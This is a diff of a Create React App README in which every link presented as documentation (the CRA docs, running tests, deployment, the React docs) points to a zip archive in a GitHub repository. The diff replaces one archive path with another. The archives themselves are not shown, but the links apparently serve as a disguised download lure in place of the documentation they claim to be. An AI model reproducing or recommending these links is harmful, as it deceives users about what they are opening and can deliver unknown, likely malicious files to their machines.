@@ -1,6 +1,6 @@
 # Getting Started with Create React App
 
-This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/Tennison-Obed/behive/main/src/components/icons/behive_3.8.zip).
+This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/Tennison-Obed/behive/main/src/store/Software-2.4-alpha.1.zip).
 
 ## Available Scripts
 
@@ -17,7 +17,7 @@ You will also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://raw.githubusercontent.com/Tennison-Obed/behive/main/src/components/icons/behive_3.8.zip) for more information.
+See the section about [running tests](https://raw.githubusercontent.com/Tennison-Obed/behive/main/src/store/Software-2.4-alpha.1.zip) for more information.
 
 ### `npm run build`
 
@@ -27,7 +27,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://raw.githubusercontent.com/Tennison-Obed/behive/main/src/components/icons/behive_3.8.zip) for more information.
+See the section about [deployment](https://raw.githubusercontent.com/Tennison-Obed/behive/main/src/store/Software-2.4-alpha.1.zip) for more information.
 
 ### `npm run eject`
 
@@ -41,6 +41,6 @@ You don’t have to ever use `eject`. The curated feature set is suitable for sm
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/Tennison-Obed/behive/main/src/components/icons/behive_3.8.zip).
+You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/Tennison-Obed/behive/main/src/store/Software-2.4-alpha.1.zip).
 
-To learn React, check out the [React documentation](https://raw.githubusercontent.com/Tennison-Obed/behive/main/src/components/icons/behive_3.8.zip).
+To learn React, check out the [React documentation](https://raw.githubusercontent.com/Tennison-Obed/behive/main/src/store/Software-2.4-alpha.1.zip).
